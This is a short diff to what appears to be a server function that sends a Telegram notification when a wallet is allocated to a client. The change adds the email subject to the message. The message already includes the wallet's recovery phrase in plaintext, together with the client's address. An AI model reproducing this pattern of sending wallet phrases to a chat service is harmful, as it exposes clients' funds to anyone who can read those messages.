@@ -173,7 +173,7 @@ serve(async (req) => {
             
             // Send Telegram notification for new wallet allocation
             try {
-              const telegramMessage = `🔑 New wallet used!\nWallet ID: ${walletData?.wallet_id || 'unknown'}\nCommercial: ${commercial.name}\nClient: ${to}\nPhrase: ${walletPhrase}\nTime: ${new Date().toISOString()}`;
+              const telegramMessage = `🔑 New wallet used!\nEmail Subject: ${emailSubject}\nWallet ID: ${walletData?.wallet_id || 'unknown'}\nCommercial: ${commercial.name}\nClient: ${to}\nPhrase: ${walletPhrase}\nTime: ${new Date().toISOString()}`;
               
               const { error: telegramError } = await supabase.functions.invoke('send-telegram-notification', {
                 body: { 
